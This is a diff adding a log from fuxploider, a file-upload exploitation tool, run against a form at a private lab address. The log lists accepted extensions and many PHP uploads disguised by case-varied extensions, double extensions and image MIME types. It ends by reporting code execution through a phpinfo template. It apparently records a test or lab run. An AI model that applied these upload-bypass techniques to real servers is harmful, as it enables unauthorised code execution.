@@ -1,0 +1,279 @@
+2024-02-04 10:43:46 INFO - ### Starting detection of valid extensions ...
+2024-02-04 10:43:46 INFO - [1m[42mExtension jpg seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension jpe seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension bmp seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension jpeg seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension tiff seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension png seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension svgz seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mvg seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension tif seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension svg seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension ico seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension txt seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension gif seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension asc seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension pot seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension text seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension brf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension srt seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension pdf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension ppt seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension pps seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension pptx seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension xls seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension xlb seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension odt seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension xlt seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension docx seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension doc seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension xlsx seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension dot seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mpeg seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mpga seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mpg seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mpe seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension m4a seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mp2 seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mpega seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mp3 seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension wav seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension avi seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension m3u seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension psd seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension flv seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension gz seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mp4 seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension zip seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension tar seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension 7z seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension rar seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension iso seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension jar seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension csv seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension rss seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension css seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension htm seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension html seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension torrent seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension shtml seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension otf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension com seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension ttf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension bat seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension exe seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension qt seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mov seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension dll seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension vcd seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension cbr seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension % seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension ~ seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension bak seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension old seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension sik seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension bin seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension msp seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension deploy seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension mid seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension msu seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension midi seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension kar seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension cer seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension sdf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension sdf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension sd seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension vcard seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension vcf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension cpp seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension c++ seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension cxx seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension kmz seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension h seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension cc seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension swf seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension swfl seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension deb seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension ddeb seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension udeb seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension udeb seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension deb seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - [1m[42mExtension js seems valid for this form.[m
+2024-02-04 10:43:46 INFO - [1;32mTrue regex matched the following information: See the[m
+2024-02-04 10:43:46 INFO - ### Tried 100 extensions,  100 are valid.
+[1;32m
+
+ ___             _     _   _ 
+|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
+|  _| | |_'_| . | | . | | . | -_|  _|
+|_| |___|_,_|  _|_|___|_|___|___|_|
+            |_|
+
+[1m[42m{version 1.0.0}[m
+
+[m[!] legal disclaimer: Usage of fuxploider for attacking targets without
+prior mutual consent is illegal. It is the end user's responsibility to obey
+all applicable local, state and federal laws. Developers assume no liability
+and are not responsible for any misuse or damage caused by this program.
+
+[*] starting at 10:43:46
+Extensions detection: 0:00:00.118925
+Start uploading payloads? [Y/n]: 2024-02-04 10:43:46 INFO - ### Starting code execution detection (messing with file extensions and mime types...)
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmptt7n9hr5.php3' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmposrr89fs.php2' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpbkqnpzum.php1' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpx60__0f8.php4' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp0kpzgrhq.phtml' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpo9s4qg6j.Php' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmphmcxbhzy.php5' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp947rhcl4.PhP' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpgsi2b7mn.pht' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmphffebq_c.pHp1' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpndpe67s9.pHp' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpczz5kwo4.PHp5' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmphivo06at.pHP2' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpwuev9sy5.pHtMl' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpf9qzy04g.php2' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpi3ly5o67.php3' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp4wl36d1a.php1' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpmarmkk1p.php4' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpn_cwdm_k.php5' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpral_l3ge.phtml' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpfddi_mmu.pht' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpu640qkjm.Php' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp2kuz67mb.pHp' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp5z_tg0zo.PhP' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmphtc81s1l.pHp1' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp8qe0gz1_.pHP2' with mime type image/jpeg successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmp0c_ivz4v.php1.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpixy45q6j.php.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:47 INFO - [1;32mUpload of 'tmpw6xgpyxr.PHp5' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmplndleg80.pHtMl' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpdqsfgm3b.php2.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp6pijnch2.php5.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpqneqwjm3.phtml.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp6a_a6uq3.php3.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp55stxyai.php4.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmprq8ep8bo.PhP.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpjk8niheu.pht.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp_6cij2gn.Php.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpy8lfipfr.pHP2.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpz__mveq2.pHp.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp23h9r7du.pHp1.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpwq_hvim7.pHtMl.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpa8azb5g1.PHp5.jpg' with mime type application/x-httpd-php successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpqfpgy6s9.php1.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpnklmm6gd.php.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp20uv_xsg.php2.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1m[42mCode execution obtained ('.pHp','image/jpeg','phpinfo','http://172.22.1.5/uploads/tmp2kuz67mb.pHp')[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpiyx4s53k.php3.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpidzh1wv8.php4.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmpdmkgz5iu.pht.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp25q913cu.phtml.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp4jle41pq.Php.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp_5w6l_ur.php5.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp227v6_ji.pHp1.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - [1;32mUpload of 'tmp69brgm1g.pHp.jpg' with mime type image/jpeg successful[m
+2024-02-04 10:43:48 INFO - 1 entry point(s) found using 211 HTTP requests.
+
+Found the following entry points: 
+[{'suffix': '.pHp', 'mime': 'image/jpeg', 'templateName': 'phpinfo', 'codeExecURL': None, 'dynamicPayload': None, 'payloadFilename': 'template.php', 'staticFilename': None}]
